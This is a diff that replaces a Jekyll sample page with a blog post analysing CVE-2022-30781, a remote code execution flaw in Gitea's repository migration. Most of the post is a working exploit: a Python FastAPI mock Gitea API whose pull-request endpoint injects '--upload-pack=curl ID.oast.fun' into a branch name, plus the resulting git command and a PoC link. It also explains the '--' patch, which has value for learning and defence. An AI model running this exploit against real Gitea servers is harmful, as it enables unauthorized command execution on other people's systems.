@@ -1,124 +1,148 @@
 ---
-title: Yet Another Sample Page
+title: Analysis of CVE-2022–30781
 published: true
 ---
 
-Text can be **bold**, _italic_, ~~strikethrough~~ or `keyword`.
 
-[Link to another page](another-page).
+# Analysis of CVE-2022–30781  
+## How Git Fetch Resulted in Critical Remote Code Execution in Gitea  
 
-There should be whitespace between paragraphs.
+![Gitea Logo](#)  
 
-There should be whitespace between paragraphs. We recommend including a README, or a file with information about your project.
+**Good Morning, Everyone!**  
+In today's post, I'll dive into an analysis of CVE-2022–30781, a critical vulnerability found in the Gitea platform. This CVE allows attackers to execute remote code on the affected server, posing a significant security risk.  
 
-# [](#header-1)Header 1
+### Here's what we'll cover:
+- Understanding How the CVE Works  
+- Writing Our Own Exploit  
+- How the Gitea Team Fixed It  
 
-This is a normal paragraph following a header. GitHub is a code hosting platform for version control and collaboration. It lets you and others work together on projects from anywhere.
+Let's jump in and enjoy!  
 
-## [](#header-2)Header 2
+---
 
-> This is a blockquote following a header.
->
-> When something is important enough, you do it even if the odds are not in your favor.
+## Import Your Git Repo  
 
-### [](#header-3)Header 3
+In every Git platform like Gitea, there's a feature that allows you to import all your repositories from another platform or git server into your platform with a single click—this feature is called **Migration**.  
 
-```js
-// Javascript code with syntax highlighting.
-var fun = function lang(l) {
-  dateformat.i18n = require('./lang/' + l)
-  return true;
-}
+Besides `.git` repositories, it also provides options to import:  
+- Pull requests  
+- Wiki pages  
+- Issues  
+
+To extract this data, Gitea communicates with the chosen platform's API. One of the migration options is importing a repository from another Gitea server. By choosing this option, you can notice in the logs a few requests from Gitea for specific endpoints.  
+
+One of these endpoints returns the repository's pull request information, including the pull request branch. Gitea fetches this branch using the command:  
+```bash
+$ git fetch <remote> <branch>
+``` 
+
+Unfortunately, we cannot escape using whitespace here to achieve an RCE.  
+
+---
+
+## Fetch Options  
+
+The `git fetch` subcommand has a few options, as documented in the [Git Fetch Documentation](https://git-scm.com/docs/git-fetch).  
+
+### The interesting one:
+- `--upload-pack <upload-pack>`  
+  This option specifies a non-default path for the `git-upload-pack` tool when fetching from a repository.  
+
+Using this option, we can potentially achieve **Remote Code Execution (RCE)**. Injecting `--upload-pack='CMD'` into a branch name or remote repository path allows us to change the default behavior. However, Git itself doesn't allow this directly. 😞  
+
+But since Gitea uses APIs to fetch repository information, we can set up a mock server to return fake data. When the server asks for the pull request branch, we include the `--upload-pack` option in the response to test if it gets executed.  
+
+---
+
+## Writing the Exploit  
+
+When writing exploits, I always choose Python for its simplicity and speed. Here's how I approached writing this exploit.  
+
+The first step is understanding what the Gitea API client expects as a response. By analyzing the Gitea Swagger file, I created this simple mock API using FastAPI:  
+
+```python
+from fastapi import APIRouter
+
+router = APIRouter(prefix="/api/v1")
+RCE_PAYLOAD = "curl ID.oast.fun"
+
+# Mock data for some endpoints
+MAX_RESPONSE_ITEMS = 50
+DEFAULT_PAGING_NUM = 30
+DEFAULT_GIT_TREES_PER_PAGE = 1000
+DEFAULT_MAX_BLOB_SIZE = 10485760
+full_uri = "http://localhost:3000/"
+
+@router.get("/version")
+async def get_version():
+    return {"version": "1.16.6"}
+
+@router.get("/settings/api")
+async def get_settings():
+    return {
+        "max_response_items": MAX_RESPONSE_ITEMS,
+        "default_paging_num": DEFAULT_PAGING_NUM,
+        "default_git_trees_per_page": DEFAULT_GIT_TREES_PER_PAGE,
+        "default_max_blob_size": DEFAULT_MAX_BLOB_SIZE,
+    }
+
+@router.get("/repos/{owner}/{repo}")
+async def get_repo_info(owner: str, repo: str):
+    return {
+        "clone_url": f"{full_uri}{owner}/{repo}",
+        "owner": {"login": owner},
+    }
+
+@router.get("/repos/{owner}/{repo}/topics")
+async def get_repo_topics(owner: str, repo: str):
+    return {"topics": []}
+
+@router.get("/repos/{owner}/{repo}/pulls")
+async def get_repo_pulls(owner: str, repo: str):
+    return [
+        {
+            "base": {"ref": "master"},
+            "head": {
+                "ref": f"--upload-pack={RCE_PAYLOAD}",
+                "repo": {
+                    "clone_url": "./",
+                    "owner": {"login": "master"},
+                },
+            },
+            "updated_at": "2001-01-01T05:00:00+01:00",
+            "user": {},
+        }
+    ]
 ```
 
-```ruby
-# Ruby code with syntax highlighting
-GitHubPages::Dependencies.gems.each do |gem, version|
-  s.add_dependency(gem, "= #{version}")
-end
-```
+In the `/pulls` endpoint, I injected the `--upload-pack` option into the `ref`, corresponding to the pull request's base branch.  
 
-#### [](#header-4)Header 4
+### Testing the Exploit  
 
-*   This is an unordered list following a header.
-*   This is an unordered list following a header.
-*   This is an unordered list following a header.
+I ran the mock API, created a new migration in Gitea, and set the repository URL to `http://localhost:3000/test/test`. I enabled the option to fetch pull requests, ensuring it fetched the repository's pull requests during migration.  
 
-##### [](#header-5)Header 5
+### Result  
 
-1.  This is an ordered list following a header.
-2.  This is an ordered list following a header.
-3.  This is an ordered list following a header.
+In the background, Gitea executed:  
+```bash
+$ git fetch origin --upload-pack='curl <host>'
+```  
 
-###### [](#header-6)Header 6
+This caused Gitea to make the specified curl request, successfully demonstrating an **RCE** as a Proof of Concept (PoC).  
 
-| head1        | head two          | three |
-|:-------------|:------------------|:------|
-| ok           | good swedish fish | nice  |
-| out of stock | good and plenty   | nice  |
-| ok           | good `oreos`      | hmm   |
-| ok           | good `zoute` drop | yumm  |
+---
 
-### There's a horizontal rule below this.
+## Patching the Bug  
 
-* * *
+The Gitea team fixed this bug by using `--`, which forces Git to treat everything following it as a plain string rather than a parsable option. This effectively resolves the issue.  
 
-### Here is an unordered list:
+---
 
-*   Item foo
-*   Item bar
-*   Item baz
-*   Item zip
+**And that's it!**  
+I hope you found this helpful.  
 
-### And an ordered list:
+You can access the testing lab and the exploit at:  
+[latestpocs/CVE-2022–30781](https://github.com/MindPatch/latestpocs)  
 
-1.  Item one
-1.  Item two
-1.  Item three
-1.  Item four
-
-### And a nested list:
-
-- level 1 item
-  - level 2 item
-  - level 2 item
-    - level 3 item
-    - level 3 item
-- level 1 item
-  - level 2 item
-  - level 2 item
-  - level 2 item
-- level 1 item
-  - level 2 item
-  - level 2 item
-- level 1 item
-
-### Small image
-
-![](https://assets-cdn.github.com/images/icons/emoji/octocat.png)
-
-### Large image
-
-![](https://guides.github.com/activities/hello-world/branching.png)
-
-
-### Definition lists can be used with HTML syntax.
-
-<dl>
-<dt>Name</dt>
-<dd>Godzilla</dd>
-<dt>Born</dt>
-<dd>1952</dd>
-<dt>Birthplace</dt>
-<dd>Japan</dd>
-<dt>Color</dt>
-<dd>Green</dd>
-</dl>
-
-```
-Long, single-line code blocks should not wrap. They should horizontally scroll if they are too long. This line should be long enough to demonstrate this.
-```
-
-```
-The final element.
-```
+Take care, and see you next time! 🙂  
